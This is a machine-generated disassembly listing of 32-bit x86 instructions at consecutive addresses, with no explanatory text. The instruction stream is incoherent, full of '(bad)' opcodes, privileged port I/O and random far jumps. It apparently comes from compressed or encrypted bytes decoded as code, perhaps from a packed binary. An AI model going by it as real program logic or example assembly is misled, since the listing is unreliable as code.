  416fef:	imul   edx,DWORD PTR [edx-0x20],0xd33655c3
  416ff6:	lea    ebp,[edx+edi*1-0x4faebb83]
  416ffd:	push   eax
  416ffe:	sub    BYTE PTR [esi+0x51],dh
  417001:	fidiv  WORD PTR [edx]
  417003:	fimul  DWORD PTR [ecx-0x692ff622]
  417009:	icebp  
  41700a:	fcmovu st,st(0)
  41700c:	add    ch,dl
  41700e:	ds popa 
  417010:	stos   BYTE PTR es:[edi],al
  417011:	mov    WORD PTR [esp+edx*2-0x253b5ab7],ds
  417018:	popa   
  417019:	mov    ds:0xa279ec9c,eax
  41701e:	mov    WORD PTR [esi+ecx*2],ds
  417021:	stc    
  417022:	inc    esp
  417023:	jle    0x41702e
  417025:	sub    ch,BYTE PTR [ebx]
  417027:	jge    0x416fa9
  417029:	sar    DWORD PTR [ecx],1
  41702b:	mov    bx,0x30f6
  41702f:	jnp    0x417034
  417031:	mov    ebp,0x60223007
  417036:	cdq    
  417037:	das    
  417038:	or     al,0x8
  41703a:	add    BYTE PTR [esi+ecx*4+0x2f],dh
  41703e:	hlt    
  41703f:	ja     0x417080
  417041:	jbe    0x417049
  417043:	fsub   QWORD PTR [ebx]
  417045:	cmc    
  417046:	pop    ds
  417047:	popa   
  417048:	test   eax,0x5a1c9cd9
  41704d:	pushf  
  41704e:	ret    0xe941
  417051:	repz pop esi
  417053:	sub    al,0x80
  417055:	rcl    BYTE PTR [edx],cl
  417057:	fwait
  417058:	jmp    0x4170a6
  41705a:	fidivr WORD PTR [eax-0x449dccbd]
  417060:	outs   dx,BYTE PTR ds:[esi]
  417061:	sub    al,0xcb
  417063:	aaa    
  417064:	and    ebx,ecx
  417066:	jo     0x4170e5
  417068:	outs   dx,DWORD PTR ds:[esi]
  417069:	xchg   esp,eax
  41706a:	xchg   ecx,eax
  41706b:	rcl    DWORD PTR [ecx+0x6525dde],cl
  417071:	or     DWORD PTR [edi+0x34],ecx
  417074:	and    eax,0xfdcdd73f
  417079:	lock fld QWORD PTR gs:[edx-0xcba670d]
  417081:	cmp    eax,ecx
  417083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417084:	sbb    bl,ch
  417086:	xchg   edx,eax
  417087:	rcr    BYTE PTR [eax],cl
  417089:	push   ss
  41708a:	and    eax,0x82ec6119
  41708f:	sahf   
  417090:	push   ecx
  417091:	test   eax,0x31acfb4c
  417096:	scas   eax,DWORD PTR es:[edi]
  417097:	imul   ecx,eax
  41709a:	fisub  WORD PTR [ecx+eax*2-0x33927ea3]
  4170a1:	pop    ss
  4170a2:	outs   dx,DWORD PTR ds:[esi]
  4170a3:	jbe    0x417070
  4170a5:	add    cl,BYTE PTR [eax]
  4170a7:	xor    edx,DWORD PTR [eax+0x2a]
  4170aa:	mov    bh,0x9
  4170ac:	fwait
  4170ad:	mov    ds:0x5d957a49,al
  4170b2:	aas    
  4170b3:	shl    al,0xa5
  4170b6:	sbb    esi,DWORD PTR [esi-0x2a]
  4170b9:	iret   
  4170ba:	outs   dx,BYTE PTR ds:[esi]
  4170bb:	jle    0x4170f0
  4170bd:	je     0x417134
  4170bf:	sub    al,BYTE PTR [ebp-0x35]
  4170c2:	nop
  4170c3:	scas   al,BYTE PTR es:[edi]
  4170c4:	push   cs
  4170c5:	fld    TBYTE PTR [edx-0x80]
  4170c8:	and    DWORD PTR [edx-0x11],edi
  4170cb:	pop    eax
  4170cc:	in     eax,0xb2
  4170ce:	sbb    edi,DWORD PTR [ebx]
  4170d0:	sti    
  4170d1:	mov    esp,0xe10d25c
  4170d6:	mov    esp,0x56cc8653
  4170db:	or     DWORD PTR [ecx-0x38b7f6b6],edi
  4170e1:	push   ecx
  4170e2:	mov    ebp,ebp
  4170e4:	or     eax,0xfccf6ca
  4170e9:	push   edi
  4170ea:	iret   
  4170eb:	xor    BYTE PTR [eax+0x40],ah
  4170ee:	in     al,dx
  4170ef:	lds    eax,FWORD PTR [ebx+0x7d6c1ce6]
  4170f5:	pop    edx
  4170f6:	ror    BYTE PTR [ebp-0x155b18bb],0xb5
  4170fd:	enter  0x9430,0xfe
  417101:	add    eax,0x9432d72e
  417106:	jae    0x4170de
  417108:	rcl    BYTE PTR [edx],1
  41710a:	sbb    esp,eax
  41710c:	test   BYTE PTR [ebx-0x1a],ah
  41710f:	inc    esi
  417110:	scas   al,BYTE PTR es:[edi]
  417111:	push   ss
  417112:	dec    esi
  417113:	retf   0x1a6b
  417116:	in     al,dx
  417117:	push   ebx
  417118:	pop    edi
  417119:	test   al,0xdc
  41711b:	icebp  
  41711c:	mov    al,0x2e
  41711e:	mov    eax,ds:0x5bb8fb4c
  417123:	mov    ebp,0x942075b6
  417128:	or     edi,DWORD PTR [ebx]
  41712a:	popa   
  41712b:	ret    
  41712c:	inc    esi
  41712d:	loope  0x417183
  41712f:	adc    DWORD PTR [ecx+0x6b368c23],eax
  417135:	cmp    ecx,esp
  417137:	sbb    DWORD PTR [ecx+0x75070eaf],edi
  41713d:	xlat   BYTE PTR ds:[ebx]
  41713e:	inc    eax
  41713f:	push   esp
  417140:	xor    BYTE PTR [ebp+0x1c875b44],cl
  417146:	sbb    eax,0x14309510
  41714b:	dec    eax
  41714c:	sub    ecx,DWORD PTR [ebp-0x73410f22]
  417152:	(bad)  
  417153:	cld    
  417154:	mov    esp,0xd1d2ad7b
  417159:	cmc    
  41715a:	or     DWORD PTR [eax-0x33a17d2d],0xc4bc47b6
  417164:	dec    esi
  417165:	xor    dh,BYTE PTR [ebx+0x4569c96]
  41716b:	xlat   BYTE PTR ds:[ebx]
  41716c:	push   cs
  41716d:	adc    DWORD PTR [eax-0x2b],edi
  417170:	fld    TBYTE PTR [edx+0x4eaa364b]
  417176:	xlat   BYTE PTR ds:[ebx]
  417177:	fwait
  417178:	jmp    0x4171e7
  41717a:	mov    BYTE PTR [edx+ebx*8-0x5f],ah
  41717e:	(bad)  
  417180:	mov    eax,ds:0xa7063b54
  417185:	fcom   DWORD PTR [edi-0x50]
  417188:	jmp    0x1fe5b12c
  41718d:	jmp    0x4171da
  41718f:	mov    DWORD PTR [ebx+0x846e277],ecx
  417195:	sub    DWORD PTR [ebx-0x6],esi
  417198:	(bad)  
  417199:	iret   
  41719a:	push   ecx
  41719b:	icebp  
  41719c:	(bad)
  4171a0:	or     ebp,DWORD PTR [ebp+0x32]
  4171a3:	gs aaa 
  4171a5:	and    eax,0x346a60ee
  4171aa:	(bad)  
  4171ab:	cwde   
  4171ac:	mov    edi,0xbdd07c0b
  4171b1:	retf   
  4171b2:	data16 mov bl,0xe0
  4171b5:	adc    dl,bh
  4171b7:	jae    0x41719a
  4171b9:	adc    BYTE PTR [eax-0x7e52e4b0],0x2a
  4171c0:	es sbb eax,0x13050836
  4171c6:	mov    cl,0x20
  4171c8:	les    eax,FWORD PTR [ecx-0x385547bb]
  4171ce:	mov    eax,edx
  4171d0:	and    esp,DWORD PTR [ebx]
  4171d2:	test   eax,0x9fecb107
  4171d7:	ja     0x4171a6
  4171d9:	or     eax,0x937c1242
  4171de:	ins    DWORD PTR es:[edi],dx
  4171df:	in     al,dx
  4171e0:	scas   al,BYTE PTR es:[edi]
  4171e1:	adc    BYTE PTR [ebp-0x21e2a8ea],al
  4171e7:	adc    BYTE PTR [ecx],al
  4171e9:	inc    edx
  4171ea:	jge    0x4171b5
  4171ec:	sub    BYTE PTR [eax+0x25],0xc
  4171f0:	add    BYTE PTR [eax],0x4a
  4171f3:	mov    bl,0x27
  4171f5:	jns    0x417262
  4171f7:	xor    eax,0x51ecb62e
  4171fc:	icebp  
  4171fd:	clc    
  4171fe:	cmp    bl,BYTE PTR ds:0xcbde27bb
  417204:	jmp    0x417218
  417206:	mov    ebx,0x53b51aba
  41720b:	sbb    dh,BYTE PTR [ebx+esi*1-0x34189e89]
  417212:	inc    edx
  417213:	int3   
  417214:	ds jns 0x41719a
  417217:	push   edi
  417218:	dec    esi
  417219:	xor    DWORD PTR [ebp+edi*1+0x71],ecx
  41721d:	js     0x4171da
  41721f:	jmp    FWORD PTR [edx+ecx*2+0x6b]
  417223:	(bad)
  417226:	ds ret 
  417228:	aam    0x27
  41722a:	mov    edi,0xd67421dd
  41722f:	into   
  417230:	sub    DWORD PTR [esi],esp
  417232:	mov    esi,0x97c1f275
  417237:	cwde   
  417238:	addr16 mov bl,0x3a
  41723b:	(bad)  
  41723e:	(bad)  
  41723f:	out    dx,eax
  417240:	add    DWORD PTR [ebx],ebx
  417242:	xor    al,0x23
  417244:	sub    dl,BYTE PTR [eax-0x73]
  417247:	pop    ds
  417248:	sub    DWORD PTR [ebx],0xec136c9
  41724e:	xchg   ebx,eax
  41724f:	xor    al,0xa
  417251:	cwde   
  417252:	mov    ebp,0x11a6b9ff
  417257:	mov    ebx,0x52e012e
  41725c:	jb     0x4171ff
  41725e:	pop    eax
  41725f:	push   eax
  417260:	push   ebx
  417261:	sbb    eax,0xe66b540b
  417266:	(bad)  
  417267:	frstor [ecx-0x5e32ff9c]
  41726d:	out    dx,eax
  41726e:	adc    al,0xc3
  417270:	add    al,0xb5
  417272:	leave  
  417273:	stc    
  417274:	shr    DWORD PTR [ebx+0xd843df5],1
  41727a:	jnp    0x417223
  41727c:	push   ebp
  41727d:	and    ch,BYTE PTR [edx]
  41727f:	jle    0x41725a
  417281:	or     WORD PTR [ebx],cx
  417284:	xor    al,0x7
  417286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417287:	loope  0x41724c
  417289:	and    ebp,ebx
  41728b:	in     eax,dx
  41728c:	mov    eax,0x91ed069b
  417291:	lods   eax,DWORD PTR ds:[esi]
  417292:	mov    cl,0x8c
  417294:	xchg   esp,eax
  417295:	(bad)  
  417297:	or     DWORD PTR [ebp+0x5f5ae3a4],esi
  41729d:	inc    esp
  41729e:	cli    
  41729f:	mov    edi,0xe3b79f06
  4172a4:	fidivr DWORD PTR [edi+0x58]
  4172a7:	sti    
  4172a8:	xor    esp,DWORD PTR [ebx+0x2ee29fbc]
  4172ae:	jbe    0x4172a7
  4172b0:	ins    BYTE PTR es:[edi],dx
  4172b1:	imul   esi,edx,0xf3058fda
  4172b7:	sbb    DWORD PTR [edi+0x25b20d06],esp
  4172bd:	or     dl,bh
  4172bf:	stos   DWORD PTR es:[edi],eax
  4172c0:	retf   0x8eac
  4172c3:	cmc    
  4172c4:	retf   0xc255
  4172c7:	mov    dh,0xaf
  4172c9:	xor    BYTE PTR [edi+ebx*4+0x51fdac84],bl
  4172d0:	pop    edx
  4172d1:	jmp    0x38f33231
  4172d6:	neg    bh
  4172d8:	cmp    bh,ah
  4172da:	pusha  
  4172db:	inc    ebp
  4172dc:	mov    bl,0xe1
  4172de:	out    dx,al
  4172df:	xor    ecx,DWORD PTR [esi+ebp*2+0x42]
  4172e3:	test   BYTE PTR [edx+0x14],0x82
  4172e7:	out    0x47,al
  4172e9:	xor    esi,ebp
  4172eb:	mov    BYTE PTR [edi-0x20],bl
  4172ee:	sbb    eax,0x3de0cd84
  4172f3:	fnstenv [ebp-0x14]
  4172f6:	jmp    0xfa4e:0x3de2ba92
  4172fd:	cli    
  4172fe:	es out dx,al
  417300:	pop    ds
  417301:	jbe    0x41732c
  417303:	pop    ecx
  417304:	ficom  DWORD PTR [edx]
  417306:	jecxz  0x417305
  417308:	sbb    BYTE PTR [ebx-0x7d],al
  41730b:	xor    DWORD PTR [ecx+ebx*1+0xf],0x78e8dcd8
  417313:	repz test BYTE PTR [edx-0x1c],0x5f
  417318:	in     eax,0xd3
  41731a:	loop   0x417346
  41731c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41731d:	mov    dl,0x18
  41731f:	add    BYTE PTR [edx-0x32a7d6d7],ah
  417325:	int3   
  417326:	jg     0x417364
  417328:	dec    ecx
  417329:	mov    eax,0xa8ec7e0c
  41732e:	mov    ds:0x36311c53,eax
  417333:	pop    es
  417334:	push   0x79
  417336:	xchg   ebx,eax
  417337:	(bad)  
  417338:	mov    ebx,0xfdd0fc2c
  41733d:	out    0xdf,al
  41733f:	mov    BYTE PTR [ebp-0x272901eb],dl
  417345:	and    eax,0xc381547a
  41734a:	adc    bl,BYTE PTR [ebx-0x78291c83]
  417350:	pop    ebx
  417351:	fdivr  st(5),st
  417353:	adc    DWORD PTR [ebx],edx
  417355:	test   BYTE PTR [ebx-0x4d],bl
  417358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417359:	mov    esp,0x1d4ce97b
  41735e:	stos   DWORD PTR es:[edi],eax
  41735f:	ret    0x871
  417362:	mov    DWORD PTR [eax],0xaa802664
  417368:	cdq    
  417369:	and    DWORD PTR [ebx],eax
  41736b:	add    BYTE PTR [ecx],bh
  41736d:	ret    0xbb5
  417370:	jmp    0x909461c2
  417375:	or     al,0x77
  417377:	sbb    esp,DWORD PTR [ecx-0x5c]
  41737a:	xor    BYTE PTR [ebx-0x68],bl
  41737d:	adc    ebp,DWORD PTR [edx]
  41737f:	cmp    eax,DWORD PTR [ebx+ebx*2-0x16]
  417383:	ror    BYTE PTR ds:0x8dd1edb6,0xde
  41738a:	imul   ebp,DWORD PTR [ebx-0x42],0xa3d72eba
  417391:	mov    ?,esp
  417393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417394:	lods   eax,DWORD PTR ds:[esi]
  417395:	lods   al,BYTE PTR ds:[esi]
  417396:	xchg   BYTE PTR ds:0xdbaf1e5d,al
  41739c:	xor    BYTE PTR [ecx],dl
  41739e:	mov    WORD PTR [ebx-0x5e],?
  4173a1:	cmp    ebp,DWORD PTR [ebp-0x733ead13]
  4173a7:	mov    al,BYTE PTR [esi-0x29]
  4173aa:	and    ch,cl
  4173ac:	inc    esp
  4173ad:	les    ebx,FWORD PTR [edi+0x5]
  4173b0:	dec    ebp
  4173b1:	xchg   edx,eax
  4173b2:	pop    esi
  4173b3:	aam    0x28
  4173b5:	mov    ecx,0xa5b6da49
  4173ba:	push   esp
  4173bb:	neg    BYTE PTR [ebp+edx*1+0x6a958ca0]
  4173c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173c3:	mov    ecx,0x3bd83a12
  4173c8:	sbb    al,0x60
  4173ca:	xor    ebp,DWORD PTR [esi+0x795df385]
  4173d0:	inc    esi
  4173d1:	ins    DWORD PTR es:[edi],dx
  4173d2:	xor    eax,esi
  4173d4:	adc    cl,0x1a
  4173d7:	mov    ds:0xa5e21502,al
  4173dc:	outs   dx,DWORD PTR ds:[esi]
  4173dd:	call   0xd43:0x1811fb86
  4173e4:	dec    esp
  4173e5:	aam    0xf3
  4173e7:	stc    
  4173e8:	call   0xaa7ec8bb
  4173ed:	push   esp
  4173ee:	daa    
  4173ef:	aad    0x55
  4173f1:	(bad)  
  4173f2:	popa   
  4173f3:	pop    ss
  4173f4:	adc    BYTE PTR [ebx+0x1bd44c9a],bl
  4173fa:	mov    dl,cl
  4173fc:	push   0x41
  4173fe:	fsub   DWORD PTR [edi-0x79]
  417401:	aam    0xd
  417403:	jle    0x417467
  417405:	fwait
  417406:	call   0x347c:0x57122410
  41740d:	adc    dl,cl
  41740f:	jae    0x4173b5
  417411:	(bad)  
  417413:	xlat   BYTE PTR ds:[ebx]
  417414:	mov    ds:0xd27e93f4,al
  417419:	ins    BYTE PTR es:[edi],dx
  41741a:	(bad)  
  41741b:	xchg   esp,eax
  41741c:	mov    al,ds:0x4fdd0132
  417421:	cli    
  417422:	add    cl,BYTE PTR [edi+0x3411a9eb]
  417428:	xchg   ecx,eax
  417429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41742a:	inc    BYTE PTR [edi+0x7]
  41742d:	ss jge 0x417458
  417430:	aam    0xc
  417432:	ret    0x3fd2
  417435:	out    dx,eax
  417436:	mov    ah,0x45
  417438:	sub    eax,0x92c3893
  41743d:	test   edi,eax
  41743f:	xchg   ebx,eax
  417440:	jne    0x4173d3
  417442:	mov    esp,0xf269ca13
  417447:	pop    es
  417448:	push   esp
  417449:	arpl   WORD PTR [edi],cx
  41744b:	sbb    BYTE PTR gs:[esi+0x29],0x90
  417450:	int    0x57
  417452:	jg     0x417484
  417454:	sar    DWORD PTR [ebx],0x90
  417457:	jl     0x41741f
  417459:	(bad)  
  41745a:	pop    ebp
  41745b:	mov    ds:0x31b772c1,eax
  417460:	cmp    BYTE PTR [edi+0x4e0af9e3],cl
  417466:	(bad)  
  417467:	add    WORD PTR [edi+0x787e8fb4],si
  41746e:	sbb    eax,0x1ddf0836
  417473:	call   0xc10a0ad7
  417478:	fstp   DWORD PTR [edi+0x32]
  41747b:	jne    0x417451
  41747d:	adc    eax,0x76803dac
  417482:	xchg   ecx,eax
  417483:	mov    esp,0xd854bbc
  417488:	scas   al,BYTE PTR es:[edi]
  417489:	aaa    
  41748a:	ins    BYTE PTR es:[edi],dx
  41748b:	nop
  41748c:	mov    esi,0xbbc75d2a
  417491:	push   esi
  417492:	out    0x6a,al
  417494:	out    dx,al
  417495:	mov    esi,0x2d0983f
  41749a:	sti    
  41749b:	jmp    0x417422
  41749d:	add    esp,DWORD PTR [edi+0x27a8ff7a]
  4174a3:	icebp  
  4174a4:	lock mov ds:0x64d80b86,eax
  4174aa:	add    al,0x35
  4174ac:	ins    BYTE PTR es:[edi],dx
  4174ad:	cmp    bl,0x9a
  4174b0:	pop    ss
  4174b1:	lods   eax,DWORD PTR ds:[esi]
  4174b2:	adc    BYTE PTR [ebx+0x2c785e8e],cl
  4174b8:	bound  esp,QWORD PTR [edi+0x39b19d10]
  4174be:	dec    edx
  4174bf:	js     0x4174b8
  4174c1:	dec    eax
  4174c2:	stc    
  4174c3:	fdiv   QWORD PTR [edx+0xc]
  4174c6:	jnp    0x417498
  4174c8:	aaa    
  4174c9:	sub    ebp,DWORD PTR [edx-0x4d7936e5]
  4174cf:	sahf   
  4174d0:	rcl    DWORD PTR [ebp*1+0x1dd32cdd],1
  4174d7:	add    ecx,edx
  4174d9:	mov    edi,0xcde6bc10
  4174de:	ds es cld 
  4174e1:	(bad)  
  4174e3:	das    
  4174e4:	mov    ecx,0x32b7fb07
  4174e9:	shl    DWORD PTR [ebx],0xbd
  4174ec:	or     dl,ah
  4174ee:	and    ebp,edi
  4174f0:	ins    BYTE PTR es:[edi],dx
  4174f1:	inc    esi
  4174f2:	mov    ebp,0x7743418e
  4174f7:	repz test dh,ch
  4174fa:	ret    0x57c4
  4174fd:	jno    0x417512
  4174ff:	ret    0x487b
  417502:	jno    0x417512
  417504:	push   edx
  417505:	mov    BYTE PTR [ecx-0x46],bl
  417508:	or     al,0x98
  41750a:	scas   al,BYTE PTR es:[edi]
  41750b:	sub    DWORD PTR [ebx+0x7c],esp
  41750e:	pop    esp
  41750f:	mov    ebp,0x65bf091d
  417514:	es jb  0x41751b
  417517:	dec    esi
  417518:	outs   dx,BYTE PTR ds:[esi]
  417519:	sahf   
  41751a:	pusha  
  41751b:	and    BYTE PTR [eax+edi*1],al
  41751e:	rcl    DWORD PTR [esi-0x21],1
  417521:	adc    ebp,DWORD PTR [esi+0x7c]
  417524:	and    ch,BYTE PTR [edx]
  417526:	rep lods al,BYTE PTR ds:[si]
  417529:	push   esi
  41752a:	fucomp st(1)
  41752c:	inc    esp
  41752d:	sar    DWORD PTR [ecx-0x46],1
  417530:	mov    esi,DWORD PTR ds:0xb722f0c0
  417536:	dec    edi
  417537:	loope  0x417514
  417539:	in     eax,dx
  41753a:	and    eax,0x2620e508
  41753f:	cmp    bl,BYTE PTR [esi+ecx*1]
  417542:	out    0x4,eax
  417544:	popa   
  417545:	jecxz  0x41754e
  417547:	nop
  417548:	xor    esp,DWORD PTR [esi]
  41754a:	mov    ch,0xa6
  41754c:	inc    edx
  41754d:	and    ah,al
  41754f:	or     edi,ecx
  417551:	mov    ah,0xf
  417553:	arpl   WORD PTR [eax],bx
  417555:	cs call 0x877f5a9d
  41755b:	inc    ebx
  41755c:	ins    BYTE PTR es:[edi],dx
  41755d:	das    
  41755e:	adc    eax,0xf88e396b
  417563:	mov    DWORD PTR [eax+0x1eaf1dce],0x4c38631e
  41756d:	and    bl,BYTE PTR [ebp-0xf]
  417570:	sub    cl,BYTE PTR [ecx]
  417572:	out    0x7b,eax
  417574:	mov    edi,0x1434e440
  417579:	inc    eax
  41757a:	jb     0x417530
  41757c:	xlat   BYTE PTR ds:[ebx]
  41757d:	dec    edi
  41757e:	stc    
  41757f:	pop    esp
  417580:	retf   0x8f28
  417583:	mov    esp,0xb7955e31
  417588:	xchg   ecx,eax
  417589:	cmp    DWORD PTR [eax],ecx
  41758b:	retf   0x85ab
  41758e:	popa   
  41758f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417590:	out    0xe,eax
  417592:	aaa    
  417593:	enter  0x1135,0x0
  417597:	repz sti 
  417599:	add    ebx,DWORD PTR [eax+eiz*4+0xfa9489a]
  4175a0:	test   al,0xc4
  4175a2:	xor    eax,0x6e86093b
  4175a7:	or     ecx,DWORD PTR [esi+0x4b9cb68b]
  4175ad:	push   ebx
  4175ae:	imul   ebx,DWORD PTR [ebp+ebx*8-0xa2a48e0],0x94901641
  4175b9:	dec    esp
  4175ba:	jb     0x4175a9
  4175bc:	or     eax,0x3f162fab
  4175c1:	and    DWORD PTR [ecx+0x1e],ebp
  4175c4:	imul   ecx,edx,0x5475f0f
  4175ca:	push   ds
  4175cb:	imul   edi,ecx,0x45
  4175ce:	les    esi,FWORD PTR [ecx+0xb]
  4175d1:	lds    esp,FWORD PTR [ebx+0x73]
  4175d4:	imul   ebx,esi,0xffffffaf
  4175d7:	adc    BYTE PTR [ebx],0xe8
  4175da:	call   0x9060d0a4
  4175df:	test   DWORD PTR [ebx+0x7],eax
  4175e2:	pop    ecx
  4175e3:	mov    ah,0x88
  4175e5:	pushf  
  4175e6:	xor    BYTE PTR [ebp-0x6cc49cfb],dh
  4175ec:	mov    ch,0xca
  4175ee:	shr    bh,1
  4175f0:	sub    al,0xf7
  4175f2:	aaa    
  4175f3:	mov    cl,ch
  4175f5:	scas   al,BYTE PTR es:[edi]
  4175f6:	cmp    dl,BYTE PTR [ecx]
  4175f8:	mov    ebx,0x33df7e30
  4175fd:	int3   
  4175fe:	cmp    dl,BYTE PTR [edx+0x525c3c9a]
  417604:	inc    esi
  417605:	xor    eax,0x884cb8de
  41760a:	xor    BYTE PTR [eax+0x5d],al
  41760d:	les    eax,FWORD PTR [edx]
  41760f:	and    dh,BYTE PTR [edi]
  417611:	xlat   BYTE PTR ds:[ebx]
  417612:	sahf   
  417613:	int    0x33
  417615:	xor    ah,BYTE PTR [ecx-0x775b9e38]
  41761b:	(bad)  
  41761c:	sub    DWORD PTR [ecx+0x233fbcf7],edi
  417622:	mov    bh,0x79
  417624:	xchg   esp,eax
  417625:	les    esp,FWORD PTR [eax+esi*4]
  417628:	jmp    0x262e57b
  41762d:	mov    edi,0xcdb5987d
  417632:	shl    DWORD PTR [esp+ebx*8+0x9],1
  417636:	or     DWORD PTR [ebp-0x34f2ebcd],0x3
  41763d:	gs pop ebx
  41763f:	sbb    al,0x85
  417641:	test   eax,0x5f6a4490
  417646:	fwait
  417647:	fs sahf 
  417649:	pop    es
  41764a:	loop   0x417652
  41764c:	push   edi
  41764d:	mov    esi,0x66e60cb1
  417652:	sbb    al,0x7
  417654:	mov    ecx,0xc74073ce
  417659:	repnz mov dl,0x2b
  41765c:	mov    ebx,edx
  41765e:	sub    eax,0x7fa89f3a
  417663:	fcmovnbe st,st(5)
  417665:	arpl   WORD PTR ds:[ebx-0x40],di
  417669:	mov    ds:0x74fec48e,al
  41766e:	mov    ds:0x3497e640,al
  417673:	das    
  417674:	inc    edx
  417675:	test   DWORD PTR [edi],eax
  417677:	cld    
  417678:	lea    edx,[eax+0x26]
  41767b:	pop    edx
  41767c:	cmp    al,0x11
  41767e:	ror    BYTE PTR [edi+edi*8+0x4a1e59c2],cl
  417685:	mov    dl,0xcb
  417687:	xchg   bx,ax
  417689:	dec    edx
  41768a:	mov    al,ds:0x951aeb15
  41768f:	(bad)  
  417690:	ins    DWORD PTR es:[edi],dx
  417691:	mov    ebp,0x22d563c6
  417696:	mov    cl,0x8e
  417698:	lock mov al,0x74
  41769b:	scas   eax,DWORD PTR es:[edi]
  41769c:	push   0x1a
  41769e:	stc    
  41769f:	test   dl,al
  4176a1:	push   cs
  4176a2:	cmp    eax,DWORD PTR [edi-0x48]
  4176a5:	or     edx,esi
  4176a7:	call   DWORD PTR [esi+0x413e23b8]
  4176ad:	pushf  
  4176ae:	stos   BYTE PTR es:[edi],al
  4176af:	mov    DWORD PTR [edi+esi*4],ebp
  4176b2:	mov    bh,0xb2
  4176b4:	xor    DWORD PTR [edi-0x66],eax
  4176b7:	dec    esp
  4176b8:	jmp    0xdbd1:0x8a4178c8
  4176bf:	push   cs
  4176c0:	push   ds
  4176c1:	pop    esi
  4176c2:	ja     0x417663
  4176c4:	push   ebp
  4176c5:	jns    0x417659
  4176c7:	mov    bl,BYTE PTR [edx]
  4176c9:	sbb    ah,BYTE PTR [esi+0x53e7c1c4]
  4176cf:	push   esp
  4176d0:	fistp  WORD PTR ds:0x21809d65
  4176d6:	jge    0x4176bc
  4176d8:	push   ss
  4176d9:	or     dh,0xcc
  4176dc:	sbb    ah,BYTE PTR [ecx-0xf]
  4176df:	jns    0x417709
  4176e1:	mov    bh,0x96
  4176e3:	stc    
  4176e4:	aaa    
  4176e5:	jmp    0x41769a
  4176e7:	fwait
  4176e8:	xchg   esp,eax
  4176e9:	jecxz  0x41776a
  4176eb:	jl     0x4176f8
  4176ed:	mov    ds:0x25859e45,eax
  4176f2:	mov    ch,0x13
  4176f4:	xor    al,0x1
  4176f6:	mov    bl,0xe
  4176f8:	xor    eax,0xcb518ece
  4176fd:	push   cs
  4176fe:	xchg   edi,eax
  4176ff:	jl     0x4176a6
  417701:	inc    eax
  417702:	fsubp  st(2),st
  417704:	push   ss
  417705:	inc    edx
  417706:	jne    0x41776e
  417708:	in     al,dx
  417709:	mov    dh,0xd5
  41770b:	dec    edx
  41770c:	aad    0xbf
  41770e:	rol    BYTE PTR [ecx+0x67],0x63
  417712:	mov    cs,WORD PTR [ebx]
  417714:	xchg   BYTE PTR [edx+0x35a4e5aa],ah
  41771a:	int3   
  41771b:	or     edi,DWORD PTR [ebp-0x26]
  41771e:	push   0x7f
  417720:	push   ecx
  417721:	iret   
  417722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417723:	jmp    0x4176cd
  417725:	fcom   QWORD PTR [ecx]
  417727:	into   
  417728:	dec    esi
  417729:	adc    bh,BYTE PTR [ebp+0x5957b529]
  41772f:	or     BYTE PTR [ebx],0xf6
  417732:	push   ebp
  417733:	mov    eax,ds:0x909b0df9
  417738:	hlt    
  417739:	loope  0x4177b1
  41773b:	and    dl,ch
  41773d:	xchg   esp,eax
  41773e:	icebp  
  41773f:	xor    eax,0x22822ee2
  417744:	sub    al,BYTE PTR [edi+0x47af32ba]
  41774a:	or     ebx,ebx
  41774c:	pmulhuw mm2,mm2
  41774f:	and    ecx,DWORD PTR [ebx]
  417751:	inc    ebp
  417752:	mov    eax,0x64af0332
  417757:	sub    eax,0x53f3f4cb
  41775c:	popf   
  41775d:	jne    0x4176e6
  41775f:	in     al,0x3a
  417761:	xor    eax,0x6a916b4c
  417766:	mov    ebx,0x43503a56
  41776b:	(bad)  
  41776c:	nop
  41776d:	mov    edi,0x840430a7
  417772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417773:	dec    ebx
  417774:	xor    edx,DWORD PTR ds:0x3c7b9ad0
  41777a:	xchg   esi,eax
  41777b:	(bad)  
  41777c:	mov    edi,0x2cca9f75
  417781:	test   DWORD PTR [eax+0x4f3923bf],ebp
  417787:	push   ecx
  417788:	lea    edi,[eax+eiz*2]
  41778b:	sbb    dl,BYTE PTR [ebx+edx*4]
  41778e:	loope  0x4177f9
  417790:	ins    DWORD PTR es:[edi],dx
  417791:	add    ah,0xc6
  417794:	adc    al,0xfe
  417796:	mov    cl,0xe1
  417798:	jbe    0x4177c7
  41779a:	jl     0x4177a6
  41779c:	mov    ch,0x86
  41779e:	retf   
  41779f:	push   ebp
  4177a0:	or     cl,BYTE PTR [ebp-0x7a]
  4177a3:	adc    WORD PTR [eax-0xf424e03],dx
  4177aa:	fiadd  DWORD PTR [eax]
  4177ac:	sti    
  4177ad:	jp     0x4177da
  4177af:	icebp  
  4177b0:	sub    eax,ebp
  4177b2:	add    BYTE PTR [esi+0x41],ah
  4177b5:	in     al,dx
  4177b6:	dec    DWORD PTR [ecx+esi*4+0x4e800446]
  4177bd:	fimul  WORD PTR [eax-0x17bb0508]
  4177c3:	xlat   BYTE PTR ds:[ebx]
  4177c4:	jno    0x41783e
  4177c6:	cmp    eax,0xd0fa7b64
  4177cb:	mov    ecx,0xa626ab9d
  4177d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177d1:	shl    DWORD PTR ds:0x3504b7c3,1
  4177d7:	repz das 
  4177d9:	xor    BYTE PTR [ebp-0x783eff15],bl
  4177df:	(bad)  
  4177e0:	pop    ebx
  4177e1:	push   0x55
  4177e3:	sub    eax,0x24c1043d
  4177e8:	daa    
  4177e9:	nop
  4177ea:	mov    ch,BYTE PTR [edi-0xf]
  4177ed:	retf   0x6bbd
  4177f0:	(bad)
  4177f3:	xchg   dh,cl
  4177f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177f6:	jl     0x417833
  4177f8:	and    ecx,DWORD PTR [edx+esi*2+0x63cc95a1]
  4177ff:	xor    al,0x3a
  417801:	mov    dl,0xa7
  417803:	js     0x4177e9
  417805:	push   0x7
  417807:	push   edx
  417808:	leave  
  417809:	aas    
